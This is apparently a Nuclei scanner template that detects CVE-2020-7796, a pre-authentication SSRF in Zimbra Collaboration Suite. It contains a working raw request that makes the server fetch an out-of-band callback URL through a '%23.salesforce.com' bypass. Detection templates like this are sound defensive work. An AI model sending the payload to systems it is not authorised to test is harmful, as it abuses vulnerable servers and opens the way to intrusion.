id: zimbra-preauth-ssrf
info:
  name: Zimbra Collaboration Suite - Server-Side Request Forgery
  author: gy741
  severity: critical
  description: Zimbra Collaboration Suite is vulnerable to Server-Side Request Forgery
    (SSRF), enabling attackers to inject third-party code as their own.
  reference:
  - https://www.adminxe.com/2183.html
  - https://nvd.nist.gov/vuln/detail/CVE-2020-7796
  - https://wiki.zimbra.com/wiki/Zimbra_Releases/8.8.15/P7
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-7796
    cwe-id: CWE-918
  tags: zimbra,ssrf,oast
  metadata:
    impact: The zimbra-preauth-ssrf vulnerability in Zimbra Collaboration Suite can
      have a severe impact as it enables unauthorized access to the system and the
      execution of malicious code.
    recommendation: It is recommended to update Zimbra Collaboration Suite to the
      latest version to prevent potential exploitation of the zimbra-preauth-ssrf
      vulnerability.
requests:
- raw:
  - 'GET /service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://{{interactsh-url}}%23.salesforce.com/
    HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    '
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
